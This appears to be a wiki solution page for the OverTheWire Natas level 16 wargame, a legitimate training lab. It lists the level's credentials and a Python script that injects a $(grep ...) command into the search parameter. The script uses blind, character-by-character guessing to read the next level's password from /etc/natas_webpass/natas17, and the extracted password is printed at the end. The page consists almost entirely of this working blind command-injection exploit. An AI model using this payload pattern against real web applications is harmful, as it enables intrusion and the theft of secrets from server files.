[Category:OverTheWire-Natas](/Category:OverTheWire-Natas "wikilink")

Username: natas16 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh URL:
<http://natas16.natas.labs.overthewire.org>

`  `
`import requests`
`  `
`  `
`password = ''`
`possible = ''`
`  `
`for char in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ":`
`    querystring = 'conceptual$(grep {} /etc/natas_webpass/natas17)'.format(str(char))`
`    print(querystring)`
`    r = requests.get('http://natas16.natas.labs.overthewire.org/?submit=Search&needle='+querystring, auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))`
`    if("conceptually" not in r.text):`
`        possible += str(char)`
`        print(possible)`
`  `
`password = ""`
`for i in range(31):`
`    for char in possible:`
`        querystring = 'conceptual$(grep ^{} /etc/natas_webpass/natas17)'.format(password+str(char))`
`        print(querystring)`
`        r = requests.get('http://natas16.natas.labs.overthewire.org/?submit=Search&needle='+querystring, auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))`
`        if("conceptually" not in r.text):`
`            password += str(char)`
`            print(password)`
`  `

8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw